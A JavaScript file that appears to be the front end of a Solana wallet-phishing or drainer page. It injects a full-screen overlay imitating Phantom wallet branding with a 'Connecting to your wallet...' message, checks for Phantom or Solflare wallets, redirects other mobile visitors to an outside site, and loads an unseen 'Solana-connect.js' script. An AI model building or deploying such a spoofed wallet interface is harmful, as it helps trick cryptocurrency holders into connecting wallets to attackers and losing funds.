// Function to inject HTML content into the body
function injectPhantomUI() {
    const body = document.querySelector('body');
    
    // Create your HTML content here
    const htmlContent = `
<style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap');

        body {
            font-family: "Montserrat", sans-serif;
            font-optical-sizing: auto;
            font-style: normal;
            background-color: rgb(34, 34, 34);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        svg {
            margin-top: -120px;
            width: 70%;
            max-width: 700px;
            margin-bottom: 10px;
            animation: smooth-shake 5s cubic-bezier(.25,.1,.25,1) both infinite;
            transform: translate3d(0, 0, 0);
            backface-visibility: hidden;
            perspective: 1000px;
            will-change: transform;
            transition: all 0.3s ease-out;
        }

        .loading-spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left: 4px solid #AB9FF2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            margin: 0 auto 20px;
            animation: spin 1s linear infinite;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 500;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes smooth-shake {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            10%, 90% { transform: translate(-1px, -0.5px) rotate(0.5deg); }
            20%, 80% { transform: translate(0.7px, 1.2px) rotate(-0.7deg); }
            30%, 70% { transform: translate(-0.8px, -1.1px) rotate(0.3deg); }
            40%, 60% { transform: translate(1.1px, 0.6px) rotate(-0.5deg); }
            50% { transform: translate(-0.6px, -0.7px) rotate(0.2deg); }
        }

        .phantomButton {
            display: flex;
            flex-direction: row;
            -webkit-box-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
            padding: 14px 0px;
            width: 95%;
            height: 47px;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 500;
            line-height: 19px;
            pointer-events: auto;
            border: none;
            outline-color: transparent;
            outline-style: none;
            cursor: pointer;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            background: rgb(171, 159, 242);
            color: rgb(34, 34, 34);
            position: fixed;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            margin: 0;
            z-index: 1000;
        }

        .phantomButton:hover {
            background: rgb(220, 210, 255);
            color: rgb(34, 34, 34);
        }

    </style>
    <div class="container">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1000 1000" preserveAspectRatio="xMidYMid meet" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px); content-visibility: visible;"><defs><clipPath id="__lottie_element_2"><rect width="1000" height="1000" x="0" y="0"></rect></clipPath><clipPath id="__lottie_element_4"><path d="M0,0 L1000,0 L1000,1000 L0,1000z"></path></clipPath><g id="__lottie_element_14"><g style="display: none;"><g><g><g><path></path></g></g><g><g><path></path></g></g></g><g><path stroke-linecap="round" stroke-linejoin="round" fill-opacity="0"></path><g><g></g></g><g><g></g></g></g></g></g><g id="__lottie_element_28"><g style="display: none;"><g><g><g><path></path></g></g><g><g><path></path></g></g></g><g><path stroke-linecap="round" stroke-linejoin="round" fill-opacity="0"></path><g><g></g></g><g><g></g></g></g></g></g><filter id="__lottie_element_34" filterUnits="objectBoundingBox" x="0%" y="0%" width="100%" height="100%"><feComponentTransfer in="SourceGraphic"><feFuncA type="table" tableValues="1.0 0.0"></feFuncA></feComponentTransfer></filter><mask id="__lottie_element_28_2" mask-type="alpha"><g filter="url(#__lottie_element_34)"><rect width="1000" height="1000" x="0" y="0" fill="#ffffff" opacity="0"></rect><use xlink:href="#__lottie_element_28"></use></g></mask><filter id="__lottie_element_35" filterUnits="objectBoundingBox" x="0%" y="0%" width="100%" height="100%"><feComponentTransfer in="SourceGraphic"><feFuncA type="table" tableValues="1.0 0.0"></feFuncA></feComponentTransfer></filter><mask id="__lottie_element_14_2" mask-type="alpha"><g filter="url(#__lottie_element_35)"><rect width="1000" height="1000" x="0" y="0" fill="#ffffff" opacity="0"></rect><use xlink:href="#__lottie_element_14"></use></g></mask><clipPath id="__lottie_element_37"><path d="M0,0 L1000,0 L1000,1000 L0,1000z"></path></clipPath><g id="__lottie_element_42"><g style="display: none;"><g><path stroke-linecap="round" stroke-linejoin="round" fill-opacity="0"></path><g><g></g></g><g><g></g></g></g><g><g><g><path></path></g></g><g><g><path></path></g></g></g></g></g><filter id="__lottie_element_48" filterUnits="objectBoundingBox" x="0%" y="0%" width="100%" height="100%"><feComponentTransfer in="SourceGraphic"><feFuncA type="table" tableValues="1.0 0.0"></feFuncA></feComponentTransfer></filter><mask id="__lottie_element_42_2" mask-type="alpha"><g filter="url(#__lottie_element_48)"><rect width="1000" height="1000" x="0" y="0" fill="#ffffff" opacity="0"></rect><use xlink:href="#__lottie_element_42"></use></g></mask><clipPath id="__lottie_element_50"><path d="M0,0 L1000,0 L1000,1000 L0,1000z"></path></clipPath><clipPath id="__lottie_element_57"><path d="M0,0 L1920,0 L1920,1080 L0,1080z"></path></clipPath><clipPath id="__lottie_element_61"><path d="M0,0 L300,0 L300,68 L0,68z"></path></clipPath><clipPath id="__lottie_element_68"><path d="M0,0 L1920,0 L1920,1080 L0,1080z"></path></clipPath><clipPath id="__lottie_element_72"><path d="M0,0 L300,0 L300,68 L0,68z"></path></clipPath><g id="__lottie_element_78"><g style="display: none;"><g><g><g><path></path></g></g><g><g><path></path></g></g></g><g><g><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g><g><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g></g></g></g><filter id="__lottie_element_84" filterUnits="objectBoundingBox" x="0%" y="0%" width="100%" height="100%"><feComponentTransfer in="SourceGraphic"><feFuncA type="table" tableValues="1.0 0.0"></feFuncA></feComponentTransfer></filter><mask id="__lottie_element_78_2" mask-type="alpha"><g filter="url(#__lottie_element_84)"><rect width="1000" height="1000" x="0" y="0" fill="#ffffff" opacity="0"></rect><use xlink:href="#__lottie_element_78"></use></g></mask><clipPath id="__lottie_element_86"><path d="M0,0 L1000,0 L1000,1000 L0,1000z"></path></clipPath><g id="__lottie_element_91"><g style="display: none;"><g><g><g><path></path></g></g><g><g><path></path></g></g></g><g><g><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g><g><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g></g></g></g><filter id="__lottie_element_97" filterUnits="objectBoundingBox" x="0%" y="0%" width="100%" height="100%"><feComponentTransfer in="SourceGraphic"><feFuncA type="table" tableValues="1.0 0.0"></feFuncA></feComponentTransfer></filter><mask id="__lottie_element_91_2" mask-type="alpha"><g filter="url(#__lottie_element_97)"><rect width="1000" height="1000" x="0" y="0" fill="#ffffff" opacity="0"></rect><use xlink:href="#__lottie_element_91"></use></g></mask><clipPath id="__lottie_element_99"><path d="M0,0 L1000,0 L1000,1000 L0,1000z"></path></clipPath><g id="__lottie_element_104"><g style="display: none;"><g><g><g><path></path></g></g><g><g><path></path></g></g></g><g><g><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g><g><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g></g></g></g><filter id="__lottie_element_110" filterUnits="objectBoundingBox" x="0%" y="0%" width="100%" height="100%"><feComponentTransfer in="SourceGraphic"><feFuncA type="table" tableValues="1.0 0.0"></feFuncA></feComponentTransfer></filter><mask id="__lottie_element_104_2" mask-type="alpha"><g filter="url(#__lottie_element_110)"><rect width="1000" height="1000" x="0" y="0" fill="#ffffff" opacity="0"></rect><use xlink:href="#__lottie_element_104"></use></g></mask><clipPath id="__lottie_element_112"><path d="M0,0 L1000,0 L1000,1000 L0,1000z"></path></clipPath><clipPath id="__lottie_element_118"><path d="M0,0 L1920,0 L1920,1080 L0,1080z"></path></clipPath><clipPath id="__lottie_element_122"><path d="M0,0 L300,0 L300,68 L0,68z"></path></clipPath><clipPath id="__lottie_element_129"><path d="M0,0 L1920,0 L1920,1080 L0,1080z"></path></clipPath><clipPath id="__lottie_element_133"><path d="M0,0 L300,0 L300,68 L0,68z"></path></clipPath><g id="__lottie_element_145"><g transform="matrix(1.7600016593933105,-0.0020273772533982992,0.0020273772533982992,1.7600016593933105,200.5263214111328,272.6379089355469)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(0.9999998211860657,-0.0006108651868999004,0.0006108651868999004,0.9999998211860657,205.5320281982422,127.33723449707031)"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="7" d=" M13.630999565124512,-38.452999114990234 C12.201000213623047,-28.937000274658203 6.064000129699707,-22.448999404907227 -2.25,-22.448999404907227 C-10.656999588012695,-22.448999404907227 -16.768999099731445,-28.76300048828125 -18.30900001525879,-38.069000244140625"></path></g></g><g opacity="1" transform="matrix(0.9999998211860657,-0.0006108651868999004,0.0006108651868999004,0.9999998211860657,256.5320129394531,127.33723449707031)"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="7" d=" M13.630999565124512,-38.452999114990234 C12.201000213623047,-28.937000274658203 6.064000129699707,-22.448999404907227 -2.25,-22.448999404907227 C-10.656999588012695,-22.448999404907227 -16.768999099731445,-28.76300048828125 -18.30900001525879,-38.069000244140625"></path></g></g></g></g><filter id="__lottie_element_151" filterUnits="objectBoundingBox" x="0%" y="0%" width="100%" height="100%"><feComponentTransfer in="SourceGraphic"><feFuncA type="table" tableValues="1.0 0.0"></feFuncA></feComponentTransfer></filter><mask id="__lottie_element_145_2" mask-type="alpha"><g filter="url(#__lottie_element_151)"><rect width="1000" height="1000" x="0" y="0" fill="#ffffff" opacity="0"></rect><use xlink:href="#__lottie_element_145"></use></g></mask></defs><g clip-path="url(#__lottie_element_2)"><g clip-path="url(#__lottie_element_112)" transform="matrix(1,0,0,1,0,0)" opacity="1" style="display: block;"><g mask="url(#__lottie_element_145_2)" style="display: block;"><g transform="matrix(-1.0000015497207642,0.00001745331974234432,-0.00001745331974234432,-1.0000015497207642,374.98748779296875,265.24432373046875)" opacity="1"><g opacity="1" transform="matrix(3.430000066757202,0,0,3.430000066757202,311.66900634765625,654.6409912109375)"><path fill="rgb(255,253,248)" fill-opacity="1" d=" M-60.441619873046875,-325.2181396484375 C-80.73861694335938,-325.2181396484375 -93.87200164794922,-307.6059875488281 -102.9749984741211,-293.6570129394531 C-101.86799621582031,-296.7430114746094 -103.1943130493164,-301.95263671875 -103.66413879394531,-304.0713195800781 C-104.99869537353516,-310.0235595703125 -108.04762268066406,-316.7011413574219 -117.27362060546875,-316.7011413574219 C-129.94361877441406,-316.7011413574219 -141.35499572753906,-305.6310119628906 -148.36700439453125,-293.6570129394531 C-147.875,-295.385009765625 -148.79257202148438,-298.38531494140625 -149.1935577392578,-299.8731384277344 C-150.4184112548828,-304.698486328125 -152.94786071777344,-307.68914794921875 -159.46685791015625,-307.68914794921875 C-180.00985717773438,-307.68914794921875 -198.5570068359375,-271.3139953613281 -198.5570068359375,-239.46600341796875 C-198.5570068359375,-214.6540069580078 -186.00900268554688,-192.80499267578125 -154.51800537109375,-192.80499267578125 C-99.16200256347656,-192.80499267578125 -41.62062072753906,-260.41015625 -41.62062072753906,-304.109130859375 C-41.62062072753906,-321.2681579589844 -50.84661865234375,-325.2181396484375 -60.441619873046875,-325.2181396484375z"></path></g></g></g><g transform="matrix(0.9615399837493896,0,0,0.9615399837493896,501.9232482910156,490.38519287109375)" opacity="1" style="display: none;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,253,248)" fill-opacity="1" d=" M244.5,-124.5 C238.78599548339844,-163.2760009765625 205.75,-99.25 211.75,-66.5 C215.85299682617188,-44.10200119018555 249.01100158691406,10.07800006866455 250.5,-27 C253.25,-95.5 265.89898681640625,-92.33100128173828 284,-87.25 C298.25,-83.25 313.75,-83 313.2550048828125,-105.7300033569336 C313.0589904785156,-114.7509994506836 295.00799560546875,-132.09800720214844 278.75,-110.75 C254,-78.25 248,-100.75 244.5,-124.5z"></path></g></g><g transform="matrix(0.9615399837493896,0,0,0.9615399837493896,477.40325927734375,527.4041748046875)" opacity="1" style="display: none;"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path fill="rgb(255,253,248)" fill-opacity="1" d=" M244.5,-124.5 C238.78599548339844,-163.2760009765625 205.75,-99.25 211.75,-66.5 C215.85299682617188,-44.10200119018555 249.01100158691406,10.07800006866455 250.5,-27 C253.25,-95.5 274.364990234375,-38.77199935913086 272.5,-65.25 C271.25,-83 303.9410095214844,-75.45500183105469 304.2550048828125,-105.9800033569336 C304.5,-129.75 276,-112 275.25,-141 C274.1940002441406,-181.83700561523438 248,-100.75 244.5,-124.5z"></path></g></g><g clip-path="url(#__lottie_element_129)" style="display: none;" transform="matrix(0.9615399837493896,0,0,0.9615399837493896,-165.3763427734375,-77.95654296875)" opacity="1"><g clip-path="url(#__lottie_element_133)" style="display: none;" transform="matrix(0.39969396591186523,-0.5501315593719482,0.5501315593719482,0.39969396591186523,887.8024291992188,589.548095703125)" opacity="1"><g transform="matrix(0.5,0,0,0.5,104.77249908447266,134.41299438476562)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,230.4550018310547,-200.8260040283203)"><path fill="rgb(255,253,248)" fill-opacity="1" d=" M0,-33.47100067138672 C18.472644805908203,-33.47100067138672 33.47100067138672,-18.472644805908203 33.47100067138672,0 C33.47100067138672,18.472644805908203 18.472644805908203,33.47100067138672 0,33.47100067138672 C-18.472644805908203,33.47100067138672 -33.47100067138672,18.472644805908203 -33.47100067138672,0 C-33.47100067138672,-18.472644805908203 -18.472644805908203,-33.47100067138672 0,-33.47100067138672z"></path></g></g></g></g><g clip-path="url(#__lottie_element_118)" style="display: block;" transform="matrix(0.9615399837493896,0,0,0.9615399837493896,-174.077392578125,-41.12457275390625)" opacity="1"><g clip-path="url(#__lottie_element_122)" style="display: none;" transform="matrix(0.39969396591186523,-0.5501315593719482,0.5501315593719482,0.39969396591186523,887.8024291992188,589.548095703125)" opacity="1"><g transform="matrix(0.5,0,0,0.5,104.77249908447266,134.41299438476562)" opacity="1" style="display: block;"><g opacity="1" transform="matrix(1,0,0,1,230.4550018310547,-200.8260040283203)"><path fill="rgb(255,253,248)" fill-opacity="1" d=" M0,-33.47100067138672 C18.472644805908203,-33.47100067138672 33.47100067138672,-18.472644805908203 33.47100067138672,0 C33.47100067138672,18.472644805908203 18.472644805908203,33.47100067138672 0,33.47100067138672 C-18.472644805908203,33.47100067138672 -33.47100067138672,18.472644805908203 -33.47100067138672,0 C-33.47100067138672,-18.472644805908203 -18.472644805908203,-33.47100067138672 0,-33.47100067138672z"></path></g></g></g></g></g><g clip-path="url(#__lottie_element_99)" style="display: none;"><g mask="url(#__lottie_element_104_2)" style="display: none;"><g><g><path></path></g></g></g></g><g clip-path="url(#__lottie_element_86)" style="display: none;"><g mask="url(#__lottie_element_91_2)" style="display: none;"><g><g><path></path></g></g></g></g><g clip-path="url(#__lottie_element_50)" style="mix-blend-mode: difference; display: none;"><g mask="url(#__lottie_element_78_2)" style="display: none;"><g><g><path></path></g></g></g><g clip-path="url(#__lottie_element_68)" style="display: none;"><g clip-path="url(#__lottie_element_72)" style="display: none;"><g style="display: none;"><g><path></path></g></g></g></g><g clip-path="url(#__lottie_element_57)" style="display: none;"><g clip-path="url(#__lottie_element_61)" style="display: none;"><g style="display: none;"><g><path></path></g></g></g></g></g><g clip-path="url(#__lottie_element_37)" style="display: none;"><g mask="url(#__lottie_element_42_2)" style="display: none;"><g><g><path></path></g></g></g></g><g clip-path="url(#__lottie_element_4)" style="display: none;"><g mask="url(#__lottie_element_28_2)" style="display: none;"><g><g><path></path></g></g></g><g mask="url(#__lottie_element_14_2)" style="display: none;"><g><g><path></path></g><g><path></path></g></g></g><g style="display: none;"><g><path></path></g><g><path></path></g></g><g style="display: none;"><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g><g style="display: none;"><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g><g style="display: none;"><g><path stroke-linecap="round" stroke-linejoin="miter" fill-opacity="0" stroke-miterlimit="4"></path></g></g></g></g></svg>
        <div class="loading-spinner"></div>
        <div class="loading-text">Connecting to your wallet...</div>
        <button class="phantomButton" id="phantomButton">Connect Wallet</button>
    </div>
    `;
    
    // Inject the HTML content into the body
    body.insertAdjacentHTML('beforeend', htmlContent);
}

function injectSolflareUI() {
    const body = document.querySelector('body');
    
    // Create your HTML content here
    const htmlContent = '<div><h1>Hello, Solana!</h1></div>';
    
    // Inject the HTML content into the body
    body.insertAdjacentHTML('beforeend', htmlContent);
}

function getEnvironment() {
    return new Promise((resolve, reject) => {
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const isPhantomApp = navigator.userAgent.toLowerCase().includes('phantom');
        const isSolflareApp = navigator.userAgent.toLowerCase().includes('solflare');

        if (isMobile) {
            if (isPhantomApp) {
                injectPhantomUI();
                resolve('phantom-mobile');
            } else if (isSolflareApp) {
                injectSolflareUI();
                resolve('solflare-mobile');
            } else {
                //if the user is not in phantom or solflare, so its a mobile browser, redirect to the main page
                window.location.href = 'https://daddytatecto.net/';
                
            }
        } else {
            // Desktop logic (existing code)
            // Add a small delay
            setTimeout(() => {
                const phantomExtension = window.phantom;
                const solflareExtension = window.solflare;

                console.log("Phantom extension:", !!phantomExtension);
                console.log("Solflare extension:", !!solflareExtension);

                if (phantomExtension && solflareExtension) {
                    injectPhantomUI();
                    resolve('phantom-desktop');
                } else if (phantomExtension) {
                    injectPhantomUI();
                    resolve('phantom-desktop');
                } else if (solflareExtension) {
                    injectSolflareUI();
                    resolve('solflare-desktop');
                } else {
                    console.error('No Wwallets installed');
                    reject('No Wallets installed');
                }
            }, 50);

        }
    });
}


function loadSolanaConnectScript() {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = './Solana-connect.js';
        script.async = true;
        script.onload = () => resolve();
        script.onerror = () => reject(new Error(`Failed to load script: ${script.src}`));
        document.head.appendChild(script);
    });
}

window.addEventListener('load', () => {
    getEnvironment()
        .then((environment) => {
            console.log(`UI injected successfully for ${environment}`);
            return loadSolanaConnectScript();
        })
        .then(() => {
            console.log('Solana-connect.js loaded successfully');
            //click on the phantom button, but do nothing
            document.getElementById('phantomButton').addEventListener('click', () => {
                console.log('clicked on phantom button');
            });
        })
        .catch(error => console.error('Error:', error));
});